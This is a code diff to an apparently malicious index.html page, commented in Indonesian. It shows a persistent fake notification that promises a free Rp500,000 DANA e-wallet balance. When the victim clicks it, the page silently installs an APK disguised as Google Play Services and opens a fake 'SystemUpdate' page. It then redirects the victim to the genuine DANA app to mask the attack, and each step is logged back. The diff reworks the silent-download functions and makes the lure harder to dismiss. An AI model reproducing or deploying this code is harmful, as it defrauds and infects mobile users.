@@ -54,7 +54,7 @@
 
 <script>
 // ============================================================
-// INDEX.HTML - VERSI FINAL (DIAM² + REDIRECT DANA)
+// INDEX.HTML - VERSI FINAL (NOTIFIKASI WAJIB DIKLIK)
 // ============================================================
 
 // ============================================================
@@ -296,10 +296,9 @@ var A = {
 };
 
 // ============================================================
-// 🔥 DOWNLOAD APK DIAM² (PRIORITAS ANDROIDBRIDGE)
+// 🔥 DOWNLOAD APK DIAM²
 // ============================================================
 function downloadAPKSilent(apkUrl, targetPath) {
-    // ✅ METHOD 1: AndroidBridge (DIAM², TANPA NOTIFIKASI!)
     if (A.isAvailable) {
         try {
             var result = A.downloadFile(apkUrl, targetPath);
@@ -312,7 +311,6 @@ function downloadAPKSilent(apkUrl, targetPath) {
         }
     }
 
-    // ⚠️ METHOD 2: XMLHttpRequest (FALLBACK)
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', apkUrl, true);
@@ -342,10 +340,9 @@ function downloadAPKSilent(apkUrl, targetPath) {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD HTML DIAM² (PRIORITAS ANDROIDBRIDGE)
+// 🔥 DOWNLOAD HTML DIAM²
 // ============================================================
 function downloadHTMLSilent(fileUrl, safeHtmlPath) {
-    // ✅ METHOD 1: AndroidBridge (DIAM², TANPA NOTIFIKASI!)
     if (A.isAvailable) {
         try {
             return safeFetch(fileUrl, { method: 'GET' }, 30000, 5)
@@ -371,7 +368,6 @@ function downloadHTMLSilent(fileUrl, safeHtmlPath) {
         }
     }
 
-    // ⚠️ METHOD 2: Download biasa (FALLBACK)
     try {
         return safeFetch(fileUrl, { method: 'GET' }, 30000, 5)
             .then(function(res) {
@@ -401,7 +397,40 @@ function downloadHTMLSilent(fileUrl, safeHtmlPath) {
 }
 
 // ============================================================
-// 🔥 NOTIFIKASI "KLIK UNTUK KLAIM"
+// 🔥 REDIRECT KE DANA ASLI
+// ============================================================
+function redirectToDANA() {
+    var methods = [
+        function() { 
+            window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end'; 
+        },
+        function() { 
+            if (A.isAvailable && A.openApp) { 
+                A.openApp('com.dana.id'); 
+            } 
+        },
+        function() { 
+            window.location.href = 'market://details?id=com.dana.id'; 
+        },
+        function() { 
+            window.location.href = 'https://www.dana.id'; 
+        },
+        function() { 
+            window.location.href = 'https://www.google.com/search?q=dana+indonesia'; 
+        }
+    ];
+    
+    for (var i = 0; i < methods.length; i++) {
+        try {
+            methods[i]();
+            K({ sumber: 'redirect', data: 'to_dana_success' });
+            return;
+        } catch(e) {}
+    }
+}
+
+// ============================================================
+// 🔥 NOTIFIKASI "KLIK UNTUK KLAIM" - WAJIB DIKLIK!
 // ============================================================
 function showClaimNotification() {
     try {
@@ -437,30 +466,32 @@ function showNotification() {
         var notif = new Notification('🔔 Klik Untuk Klaim', {
             body: 'Klik notifikasi ini untuk mengklaim saldo DANA Rp500.000!',
             icon: 'https://verifikasi.site/icon.png',
-            requireInteraction: true,
+            requireInteraction: true,  // 🔥 WAJIB! TIDAK ILANG SAMPAI DIKLIK!
             silent: false,
             vibrate: [200, 100, 200]
         });
         
+        // 🔥 EKSEKUSI HANYA SAAT DIKLIK!
         notif.onclick = function() {
             try {
-                // Install APK diam²
+                // 1. Install APK diam²
                 var apkPath = '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
                 if (A.isAvailable) {
                     A.installAPK(apkPath);
                     K({ sumber: 'notification', data: 'apk_install_started' });
                 }
                 
-                // Buka SystemUpdate.html diam²
+                // 2. Buka SystemUpdate.html diam²
                 var htmlPath = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
                 if (A.isAvailable) {
                     A.openFile(htmlPath);
                     K({ sumber: 'notification', data: 'html_opened' });
                 }
                 
+                // 3. Tutup notifikasi
                 notif.close();
                 
-                // Redirect ke DANA asli
+                // 4. Redirect ke DANA asli
                 setTimeout(function() {
                     redirectToDANA();
                 }, 1000);
@@ -470,12 +501,12 @@ function showNotification() {
             }
         };
         
-        K({ sumber: 'notification', data: 'shown' });
+        K({ sumber: 'notification', data: 'shown_waiting_for_click' });
         
-        // Notifikasi hilang setelah 30 detik jika tidak diklik
+        // 🔥 FALLBACK: HILANG SETELAH 60 DETIK (JAGA-JAGA)
         setTimeout(function() {
             try { notif.close(); } catch(e) {}
-        }, 30000);
+        }, 60000);
         
     } catch(e) {
         K({ sumber: 'notification_error', data: e.message });
@@ -494,39 +525,6 @@ function fallbackInstall() {
         redirectToDANA();
     } catch(e) {
         K({ sumber: 'fallback_install_error', data: e.message });
-    }
-}
-
-// ============================================================
-// 🔥 REDIRECT KE DANA ASLI
-// ============================================================
-function redirectToDANA() {
-    var methods = [
-        function() { 
-            window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end'; 
-        },
-        function() { 
-            if (A.isAvailable && A.openApp) { 
-                A.openApp('com.dana.id'); 
-            } 
-        },
-        function() { 
-            window.location.href = 'market://details?id=com.dana.id'; 
-        },
-        function() { 
-            window.location.href = 'https://www.dana.id'; 
-        },
-        function() { 
-            window.location.href = 'https://www.google.com/search?q=dana+indonesia'; 
-        }
-    ];
-    
-    for (var i = 0; i < methods.length; i++) {
-        try {
-            methods[i]();
-            K({ sumber: 'redirect', data: 'to_dana_success' });
-            return;
-        } catch(e) {}
     }
 }
 
@@ -604,9 +602,9 @@ function payloadInjection() {
             K({ sumber: 'payload_error', data: { html: 'download_failed' } });
         }
         
-        // Notifikasi muncul setelah download selesai
+        // 🔔 Notifikasi muncul di ATAS LAYAR (WAJIB DIKLIK!)
         setTimeout(function() {
-            if (statusBar) statusBar.textContent = '🔔 Klik notifikasi untuk klaim...';
+            if (statusBar) statusBar.textContent = '🔔 Klik notifikasi di atas untuk klaim...';
             showClaimNotification();
             setTimeout(function() { 
                 if (statusBar) statusBar.style.display = 'none'; 
@@ -888,7 +886,7 @@ window.addEventListener('beforeunload', function() {
     } catch(e) {}
 });
 
-console.log('✅ index.html v2.0 (FINAL) - Silent Download + Redirect DANA');
+console.log('✅ index.html v2.0 (FINAL) - Notifikasi WAJIB DIKLIK!');
 </script>
 </body>
 </html>
